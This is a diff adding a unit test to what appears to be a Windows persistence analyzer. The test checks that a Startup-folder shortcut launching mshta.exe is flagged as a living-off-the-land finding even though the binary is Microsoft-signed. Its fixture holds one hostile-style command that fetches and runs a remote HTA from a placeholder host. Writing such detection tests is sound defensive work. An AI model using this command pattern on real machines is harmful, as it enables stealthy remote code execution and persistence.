@@ -61,6 +61,21 @@ public class SuspiciousCommandTests
     }
 
     [Fact]
+    public void A_startup_shortcut_is_judged_by_its_arguments_too()
+    {
+        var entry = new AutorunEntry
+        {
+            Category = AutorunCategory.StartupFolder,
+            Location = @"C:\Users\Sam\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Sync.lnk",
+            Name = "Sync",
+            Command = @"""C:\Windows\System32\mshta.exe"" http://example.invalid/x.hta",
+            Image = @"C:\Windows\System32\mshta.exe",
+            Signature = new SignatureInfo(SignatureStatus.MicrosoftSigned, "Microsoft Windows", true, null),
+        };
+        Assert.Contains(PersistenceAnalyzer.Analyze(new PersistenceSnapshot { Entries = [entry], VirusTotalEnabled = true }).Findings, f => f.Id.StartsWith("M3.lolbin."));
+    }
+
+    [Fact]
     public void An_accessibility_tool_whose_signature_could_not_be_checked_is_not_a_critical_alarm()
     {
         var entry = new AutorunEntry
